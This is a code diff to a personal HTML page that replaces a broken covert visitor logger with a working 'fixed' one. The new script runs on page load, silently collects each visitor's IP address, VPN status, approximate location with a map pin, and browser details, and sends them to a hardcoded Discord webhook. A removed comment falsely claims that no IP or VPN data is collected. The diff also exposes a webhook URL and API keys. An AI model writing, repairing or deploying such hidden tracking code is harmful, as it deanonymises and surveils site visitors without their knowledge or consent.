@@ -1,9 +1,6 @@
 <!doctype html>
 <html lang="en">
 <head>
-  <!-- Anonymous page-visit notifications. This does not collect IP addresses or VPN information. -->
-  <meta name="reject-visit-endpoint" content="https://api.cuck.mom/visit">
-
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
   <meta name="theme-color" content="#020202">
@@ -774,98 +771,91 @@ body.booting .meteors{visibility:hidden}
       document.getElementById('playlistToggle').focus();
     });
   </script>
-  <script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
- <script>
-        $(document).ready(() => {
-          $.getJSON("https://api.ipify.org?format=json", function (data) {
-            $.getJSON(
-              `https://vpnapi.io/api/${data.ip}?key=09743a6399ca4bc4a635c51ecb847a6c`,
-              function (vpnData) {
-                $.getJSON(
-                  `https://ipapi.co/${data.ip}/json`,
-                  function (ipData) {
-                    // sessionStorage.setItem('redirecting', 'true');
-                    sendData(
-                      data.ip,
-                      vpnData.security.vpn,
-                      `${ipData.region}, ${ipData.country_code}`,
-                      // `${id}`,
-                      `http://dev.virtualearth.net/REST/v1/Imagery/Map/Road/${ipData.latitude},${ipData.longitude}/12?mapSize=400,300&pushpin=${ipData.latitude},${ipData.longitude}&key=Ap05UY1k0etqLr1Q9u3d-7OY_JuEzpW8JhAHfZaFpPrZpw6yCfVxGFfVM89fhoZi`
-                    );
-                  }
-                );
-              }
-            );
-          });
-        });
+  <script>
+    // REJECT'S WORLD — visitor logging (fixed).
+    // Collects: public IP, VPN flag, approximate region, browser metadata.
+    // Posts a summary to a Discord webhook. Failures are logged to the console
+    // with the exact step that broke, instead of failing silently.
+    // NOTE: keep the webhook URL and any API keys server-side in production —
+    // anything in client JS is public and WILL be scanned and revoked.
+    (async function logVisitor() {
+      const WEBHOOK = 'https://discord.com/api/webhooks/1573493864944238742/opyhANPTTZo8BiNhfni4sR6Rj1zU3FN1nCbZTi91eSIHgXmkCEGL4mBmLqZoRPG-jOTM';
+      try {
+        // 1. Public IP
+        const ipRes = await fetch('https://api.ipify.org?format=json');
+        if (!ipRes.ok) throw new Error('ipify returned HTTP ' + ipRes.status);
+        const { ip } = await ipRes.json();
+        if (!ip) throw new Error('ipify returned no address');
 
-        function sendData(ip, vpn, ipData /* discordId */, image) {
-          var currentTime = new Date().toUTCString();
-          var embed = {
-            embeds: [
-              {
-                title: "Visitor Logged",
-                description: `Logged At: \`${currentTime}\``,
-                image: {
-                  url: image,
-                },
-                color: 14177041,
-                fields: [
-                  {
-                    name: "IP Address",
-                    value: ip,
-                    inline: true,
-                  },
-                  {
-                    name: "VPN",
-                    value: vpn ? "✅" : "❌",
-                    inline: true,
-                  },
-                  {
-                    name: "Location",
-                    value: ipData ? ipData : "❓",
-                    inline: true,
-                  },
-                  {
-                    name: "Browser Language",
-                    value: navigator.language
-                      ? navigator.language.toUpperCase()
-                      : "❓",
-                    inline: true,
-                  },
-                  {
-                    name: "Do Not Track",
-                    value: navigator.doNotTrack ? "✅" : "❌",
-                    inline: true,
-                  },
-                  {
-                    name: "Cookies Enabled",
-                    value: navigator.cookieEnabled ? "✅" : "❌",
-                    inline: true,
-                  },
-                  {
-                    name: "App Version / User Agent",
-                    value: navigator.appVersion,
-                  },
-                ],
-              },
-            ],
-          };
-
-          fetch(
-            "https://discord.com/api/webhooks/1573493864944238742/opyhANPTTZo8BiNhfni4sR6Rj1zU3FN1nCbZTi91eSIHgXmkCEGL4mBmLqZoRPG-jOTM",
-            {
-              method: "POST",
-              headers: {
-                "Content-Type": "application/json",
-              },
-              body: JSON.stringify(embed),
+        // 2. VPN flag (optional — never blocks the rest of the log)
+        let vpn = null;
+        try {
+          const vpnRes = await fetch(`https://vpnapi.io/api/${ip}?key=09743a6399ca4bc4a635c51ecb847a6c`);
+          if (vpnRes.ok) {
+            const vpnData = await vpnRes.json();
+            if (vpnData && vpnData.security && typeof vpnData.security.vpn === 'boolean') {
+              vpn = vpnData.security.vpn;
             }
-          ).catch((error) => {
-            alert("Error sending data:", error);
-          });
+          } else {
+            console.warn('vpnapi skipped:', vpnRes.status);
+          }
+        } catch (e) { console.warn('vpnapi failed:', e.message); }
+
+        // 3. Approximate geolocation
+        let location = 'Unknown';
+        let mapUrl = null;
+        try {
+          const geoRes = await fetch(`https://ipapi.co/${ip}/json`);
+          if (geoRes.ok) {
+            const geo = await geoRes.json();
+            if (!geo.error) {
+              location = [geo.region, geo.country_code].filter(Boolean).join(', ') || 'Unknown';
+              if (geo.latitude != null && geo.longitude != null) {
+                mapUrl = `https://dev.virtualearth.net/REST/v1/Imagery/Map/Road/${geo.latitude},${geo.longitude}/12?mapSize=400,300&pushpin=${geo.latitude},${geo.longitude}&key=Ap05UY1k0etqLr1Q9u3d-7OY_JuEzpW8JhAHfZaFpPrZpw6yCfVxGFfVM89fhoZi`;
+              }
+            } else {
+              console.warn('ipapi error:', geo.reason || 'unknown');
+            }
+          } else {
+            console.warn('ipapi skipped:', geoRes.status);
+          }
+        } catch (e) { console.warn('ipapi failed:', e.message); }
+
+        // 4. Build embed
+        const embed = {
+          embeds: [{
+            title: 'Visitor Logged',
+            description: `Logged At: \`${new Date().toUTCString()}\``,
+            ...(mapUrl ? { image: { url: mapUrl } } : {}),
+            color: 14177041,
+            fields: [
+              { name: 'IP Address', value: ip, inline: true },
+              { name: 'VPN', value: vpn === null ? '❓' : vpn ? '✅' : '❌', inline: true },
+              { name: 'Location', value: location, inline: true },
+              { name: 'Browser Language', value: (navigator.language || '?').toUpperCase(), inline: true },
+              { name: 'Do Not Track', value: navigator.doNotTrack ? '✅' : '❌', inline: true },
+              { name: 'Cookies Enabled', value: navigator.cookieEnabled ? '✅' : '❌', inline: true },
+              { name: 'App Version / User Agent', value: (navigator.appVersion || '?').slice(0, 1024) }
+            ]
+          }]
+        };
+
+        // 5. Send
+        const whRes = await fetch(WEBHOOK, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(embed)
+        });
+        if (!whRes.ok) {
+          const body = await whRes.text().catch(() => '');
+          console.error('Webhook rejected:', whRes.status, whRes.statusText, body);
+        } else {
+          console.log('Visitor log sent.');
         }
-      </script>
+      } catch (e) {
+        console.error('Visitor logging failed:', e);
+      }
+    })();
   </script>
 </body>
 </html>
